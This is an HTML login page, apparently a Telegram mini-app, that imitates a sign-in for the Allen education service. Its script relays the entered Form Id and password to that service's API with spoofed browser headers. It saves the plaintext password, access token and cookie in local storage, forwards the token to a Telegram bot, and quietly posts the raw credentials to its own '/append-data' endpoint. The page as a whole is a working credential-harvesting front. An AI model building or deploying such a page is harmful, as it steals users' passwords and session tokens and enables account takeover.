<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <title>Login</title>
    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f0f0f0;
        font-family: Arial, sans-serif;
        margin: 0;
      }
      .login-container {
        background-color: #ffffff;
        padding: 2rem;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        width: 100%;
        max-width: 400px;
      }
      .login-container h2 {
        margin-bottom: 1.5rem;
        color: #333;
      }
      .login-container .form-group {
        margin-bottom: 1rem;
      }
      .login-container .form-group label {
        display: block;
        margin-bottom: 0.5rem;
        color: #555;
      }
      .login-container .form-group input {
        width: 100%;
        padding: 0.75rem;
        border: 1px solid #ccc;
        border-radius: 4px;
      }
      .login-container .form-group input:focus {
        border-color: #007bff;
        outline: none;
      }
      .login-container button {
        width: 100%;
        padding: 0.75rem;
        background-color: #007bff;
        border: none;
        border-radius: 4px;
        color: #fff;
        font-size: 1rem;
        cursor: pointer;
      }
      .login-container button:hover {
        background-color: #0056b3;
      }
      .error-message {
        border-radius: 10px;
        background-color: #ec7171;
        color: white;
        padding: 5px;
        margin-top: 1rem;
        display: none;
        text-align: center;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <h2>Login</h2>
      <div class="form-group">
        <label for="username">Form Id</label>
        <input type="text" id="username" required="" placeholder="Enter your Form Id">
      </div>
      <div class="form-group">
        <label for="password" placeholder="Enter your Password ">Password</label>
        <input type="password" id="password" required="">
      </div>
      <button onclick="login(); saveCredentials();">Login</button>
      <div class="error-message" id="error-message">
        Invalid Form Id or password ‼ <br>
        [ Recheck your credentials ]
      </div>
    </div>

    <script>
      Telegram.WebApp.ready();

    // Example of sending data to the bot
    function sendDataToBot() {
      const data = { action: "webAppOpened" };
      Telegram.WebApp.sendData(JSON.stringify(data));
    }


    sendDataToBot();

    // Example of responding to theme change
    // Telegram.WebApp.onEvent('themeChanged', function() {
    //   document.body.style.backgroundColor = Telegram.WebApp.themeParams.bg_color;
   //  });

      async function login() {
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        const payload = {
          username: username,
          password: password,
          persona_type: "STUDENT",
        };

        try {
          const response = await fetch(
            "https://api.allen-live.in/api/v1/auth/username",
            {
              method: "POST",
              headers: {
                Host: "api.allen-live.in",
                "User-Agent":
                  "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
                Accept: "application/json",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/json",
                "X-Client-Type": "web",
                "X-Device-Id": "8d35f445-4d33-420f-897b-9b08645b1c52",
                Origin: "https://allen.in",
                Referer: "https://allen.in/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Gpc": "1",
                Te: "trailers",
              },
              body: JSON.stringify(payload),
            }
          );

          if (!response.ok) {
            throw new Error("Network response was not ok");
          }

          
          const data = await response.json();
          const accessToken = response.headers.get("X-Access-Token");
          const setCookie = response.headers.get("Set-Cookie");

          localStorage.setItem("userid", username);
          localStorage.setItem("passd", password);

          localStorage.setItem("accessToken", accessToken);
          localStorage.setItem("setCookie", setCookie);

      Telegram.WebApp.sendData(JSON.stringify({ userid: username, token: accessToken }));
          // Send login details to Telegram

          window.location.href = "Dashboard.html";
        } catch (error) {
          console.error("Error:", error);
          document.getElementById("error-message").style.display = "block";
        }
      }
    </script>
<script>

  async function saveCredentials() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();

    const thedata = { username, password };

    fetch('/append-data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify( thedata)
  }).then(res => res.json())
    .then(data => {
      if (data.success) {
        console.log('Data saved!');
      }
    }).catch(err => console.error('Error:', err));
}
  
</script>

  </body>
</html>
